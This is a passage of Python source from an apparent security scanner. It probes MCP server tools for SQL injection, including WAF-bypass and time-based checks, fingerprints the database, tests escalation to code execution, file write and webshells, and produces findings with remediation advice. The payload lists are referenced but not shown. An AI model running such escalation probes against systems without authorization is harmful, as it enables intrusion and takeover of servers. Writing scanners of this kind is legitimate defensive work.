            if not self._is_sqli_error(result) and not self._is_blocked(result) and result:
                return SQLiResult(
                    vulnerable=True,
                    technique="stacked",
                    payload=payload,
                    response=result,
                    evidence=f"Stacked query SQLi detected"
                )
        
        # Try bypass techniques
        for name, payload, desc in self.BYPASS_PAYLOADS:
            result = await self._test_payload(client, tool_name, param_name, payload)
            if self._is_sqli_error(result) or self._is_union_success(result):
                return SQLiResult(
                    vulnerable=True,
                    technique="bypass",
                    payload=payload,
                    response=result,
                    evidence=f"SQLi detected with WAF bypass: {desc}"
                )
        
        return SQLiResult(vulnerable=False, technique="", payload="", response="")

    async def _test_payload(self, client: MCPSecClient, tool_name: str, param_name: str, payload: str) -> str:
        """Send a payload and return the response"""
        try:
            result = await asyncio.wait_for(
                client.call_tool(tool_name, {param_name: payload}),
                timeout=10.0
            )
            return self._extract_response_text(result)
        except asyncio.TimeoutError:
            return "[TIMEOUT]"
        except Exception as e:
            return f"[ERROR: {str(e)}]"

    async def _test_time_based(self, client: MCPSecClient, tool_name: str, param_name: str, 
                                payload: str, expected_delay: float) -> tuple[bool, float]:
        """Test for time-based SQLi"""
        start = time.time()
        try:
            await asyncio.wait_for(
                client.call_tool(tool_name, {param_name: payload}),
                timeout=expected_delay + 5
            )
            elapsed = time.time() - start
            # Consider it time-based if delay is within 20% of expected
            if elapsed >= expected_delay * 0.8:
                return True, elapsed
        except asyncio.TimeoutError:
            return True, expected_delay + 5
        except Exception:
            pass
        return False, time.time() - start

    def _is_blocked(self, response: str) -> bool:
        """Check if response indicates common security blocks"""
        for pattern in self.RCE_BLOCKED_INDICATORS:
            if re.search(pattern, response, re.I):
                return True
        
        lowercased = response.lower()
        if "only select queries are allowed" in lowercased or \
           "only create table statements are allowed" in lowercased or \
           "not supported" in lowercased:
            return True
        return False

    def _is_sqli_error(self, response: str) -> bool:
        """Check if response contains SQL error indicators"""
        
        # Check for blocked indicators first - if it's blocked, it's not a generic SQL vulnerability
        if self._is_blocked(response):
            return False
                
        error_patterns = [
            r"sqlite3\.OperationalError",
            r"psycopg2\.(DatabaseError|ProgrammingError)",
            r"mysql\.connector\.errors",
            r"syntax error at or near",
            r"You have an error in your SQL syntax",
            r"unrecognized token",
            r"no such column",
            r"no such table",
            r"unterminated quoted string",
            r"unclosed quotation",
            r"ORA-\d{5}",
            r"SQL.*error",
            r"query.*failed",
            r"database.*error",
            r"Error:",
            r"Exception:",
            r"syntax error",
            r"invalid input",
        ]
        return any(re.search(p, response, re.I) for p in error_patterns)

    def _is_union_success(self, response: str) -> bool:
        """Check if UNION injection succeeded"""
        # If we get back NULL or version info, UNION worked
        patterns = [
            r"NULL",
            r"\d+\.\d+\.\d+",  # Version number
            r"PostgreSQL",
            r"MySQL",
            r"SQLite",
            r"Microsoft SQL Server",
            r"Oracle",
        ]
        return any(re.search(p, response, re.I) for p in patterns)

    def _extract_response_text(self, result) -> str:
        """Extract text from MCP tool result"""
        if not result or not hasattr(result, 'content'):
            return ""
        
        texts = []
        content = getattr(result, 'content', [])
        for block in content:
            text = getattr(block, 'text', None)
            if text is not None:
                texts.append(str(text))
        return "\n".join(texts)

    async def _fingerprint_db(self, client: MCPSecClient, tool_name: str, 
                              param_name: str, sqli_result: SQLiResult) -> str:
        """Identify the database type"""
        
        # If already identified from time-based
        if sqli_result.db_type:
            return str(sqli_result.db_type)
        
        # Check error patterns
        for db_type, patterns in self.DB_FINGERPRINT_PAYLOADS["error_fingerprints"].items():
            if any(re.search(p, sqli_result.response, re.I) for p in patterns):
                return db_type
        
        # Try version queries
        for name, payload, pattern in self.DB_FINGERPRINT_PAYLOADS["version_queries"]:
            result = await self._test_payload(client, tool_name, param_name, payload)
            if re.search(pattern, result, re.I):
                if "pg_" in name:
                    return "postgres"
                elif "mysql" in name:
                    return "mysql"
                elif "mssql" in name:
                    return "mssql"
                elif "sqlite" in name:
                    return "sqlite"
                elif "oracle" in name:
                    return "oracle"
        
        return "unknown"

    async def _test_rce(self, client: MCPSecClient, tool_name: str, 
                        param_name: str, db_type: str) -> list[Finding]:
        """Test RCE escalation vectors based on database type"""
        findings = []
        
        # Select payloads based on database type
        payloads = []
        if db_type == "sqlite":
            payloads = self.SQLITE_RCE_PAYLOADS
        elif db_type == "postgres":
            payloads = self.POSTGRES_RCE_PAYLOADS
        elif db_type == "mysql":
            payloads = self.MYSQL_RCE_PAYLOADS
        elif db_type == "mssql":
            payloads = self.MSSQL_RCE_PAYLOADS
        elif db_type == "oracle":
            payloads = self.ORACLE_RCE_PAYLOADS
        else:
            # Unknown DB - try common vectors from each
            payloads = []
            payloads.extend(self.SQLITE_RCE_PAYLOADS[:3])
            payloads.extend(self.POSTGRES_RCE_PAYLOADS[:3])
            payloads.extend(self.MYSQL_RCE_PAYLOADS[:3])
        
        for name, payload, desc, attack_type in payloads:
            result = await self._test_payload(client, tool_name, param_name, payload)
            severity, evidence = self._classify_rce_result(result, attack_type, payload)
            
            if severity:
                findings.append(Finding(
                    severity=severity,
                    scanner=self.name,
                    tool_name=tool_name,
                    title=f"SQL Injection to {attack_type.upper()} via {db_type.upper()}",
                    description=(
                        f"The '{tool_name}' tool is vulnerable to SQL injection that can be "
                        f"escalated to {self._get_attack_description(attack_type)} "
                        f"using {db_type.upper()}-specific features."
                    ),
                    detail=f"Payload: {payload}\n\nResponse: {result[:1000]}",
                    evidence=evidence,
                    remediation=self._get_remediation(db_type, attack_type),
                    cwe="CWE-89",
                ))
        
        return findings

    def _classify_rce_result(self, response: str, attack_type: str, payload: str) -> tuple[Severity | None, str]:
        """Classify the severity of an RCE attempt result"""
        
        # 1. Check for explicit error indicators first
        is_error = self._is_sqli_error(response)
        
        # 2. Check for actual RCE success (CRITICAL)
        # These are strong proofs like 'uid=0' or file contents
        for pattern in self.RCE_SUCCESS_INDICATORS:
            if re.search(pattern, response, re.I):
                return Severity.CRITICAL, f"RCE confirmed: {pattern}"
        
        # 3. Check for partial success or feature confirmed (HIGH)
        # Includes permission denied or 'rows affected' which proves the SQL ran
        for pattern in self.RCE_PARTIAL_INDICATORS:
            if re.search(pattern, response, re.I):
                return Severity.HIGH, f"RCE feature exists but restricted or confirmed run: {pattern}"
        
        # 4. Check for explicit blocks (LOW)
        # These indicate the server effectively blocked the attack
        for pattern in self.RCE_BLOCKED_INDICATORS:
            if re.search(pattern, response, re.I):
                return Severity.LOW, f"RCE attempt blocked: {pattern}"
        
        # 5. If it was an error and didn't match any above, it's likely a scan-time failure
        if is_error:
            # Check if it was one of the user-reported block messages that might be caught in is_error
            block_keywords = ["queries are allowed", "statements are allowed", "not supported"]
            if any(k in response.lower() for k in block_keywords):
                return Severity.LOW, f"Search/Query type restricted: {response[:50]}"
            return None, ""
            
        # 6. If no error and reasonable response, might be successful
        if len(response) > 5:
            # Final sanity check: make sure it doesn't look like an error message
            error_keywords = ["error", "fail", "denied", "invalid", "exception", "not allowed", "unrecognized", "restricted"]
            if any(k in response.lower() for k in error_keywords):
                return None, ""
                
            if attack_type in ["file_write", "webshell", "rce"]:
                return Severity.HIGH, "Payload executed without error (verify manually)"
        
        return None, ""

    def _get_attack_description(self, attack_type: str) -> str:
        """Get human-readable attack type description"""
        descriptions = {
            "rce": "Remote Code Execution",
            "file_write": "Arbitrary File Write",
            "file_read": "Arbitrary File Read",
            "webshell": "Web Shell Upload",
            "ssrf": "Server-Side Request Forgery",
            "probe": "Information Disclosure",
        }
        return descriptions.get(attack_type, attack_type)

    def _get_remediation(self, db_type: str, attack_type: str) -> str:
        """Get remediation advice based on DB and attack type"""
        base = (
            "1. Use parameterized queries / prepared statements - NEVER concatenate user input into SQL\n"
            "2. Apply principle of least privilege to database user\n"
            "3. Implement input validation and sanitization\n"
        )
        
        db_specific = {
            "sqlite": (
                "4. Disable load_extension() if not needed: sqlite3_enable_load_extension(db, 0)\n"
                "5. Use read-only mode for queries that don't need write access\n"
                "6. Restrict ATTACH DATABASE permissions"
            ),
            "postgres": (
                "4. Disable COPY TO PROGRAM if not needed (requires superuser)\n"
                "5. Don't grant SUPERUSER to application database user\n"
                "6. Disable untrusted PL languages (plpythonu, plperlu)\n"
                "7. Restrict pg_read_file and pg_write_file permissions"
            ),
            "mysql": (
                "4. Set secure_file_priv to restrict file operations\n"
                "5. Don't grant FILE privilege to application user\n"
                "6. Disable local_infile if not needed\n"
                "7. Remove UDF libraries if not required"
            ),
            "mssql": (
                "4. Disable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 0\n"
                "5. Disable OLE Automation procedures\n"
                "6. Use contained database users\n"
                "7. Disable TRUSTWORTHY on databases"
            ),
            "oracle": (
                "4. Revoke EXECUTE on UTL_FILE, UTL_HTTP, UTL_TCP from PUBLIC\n"
                "5. Don't grant CREATE PROCEDURE to application user\n"
                "6. Restrict DBMS_SCHEDULER permissions\n"
                "7. Remove Java permissions if not needed"
            ),
        }
        
        return base + db_specific.get(db_type, "4. Follow database vendor security hardening guide")

    def _create_sqli_finding(self, tool_name: str, param_name: str, sqli_result: SQLiResult) -> Finding:
        """Create a finding for basic SQLi detection"""
        return Finding(
            severity=Severity.HIGH,
            scanner=self.name,
            tool_name=tool_name,
            title=f"SQL Injection in '{tool_name}' ({sqli_result.technique}-based)",
            description=(
                f"The '{tool_name}' tool is vulnerable to SQL injection via the '{param_name}' parameter. "
                f"Injection was confirmed using {sqli_result.technique}-based detection technique."
            ),
            detail=f"Payload: {sqli_result.payload}\n\nResponse: {sqli_result.response[:1000]}",
            evidence=sqli_result.evidence,
            remediation=(
                "1. Use parameterized queries / prepared statements\n"
                "2. Implement input validation and sanitization\n"
                "3. Apply principle of least privilege to database user\n"
                "4. Consider using an ORM with proper escaping"
            ),
            cwe="CWE-89",
        )
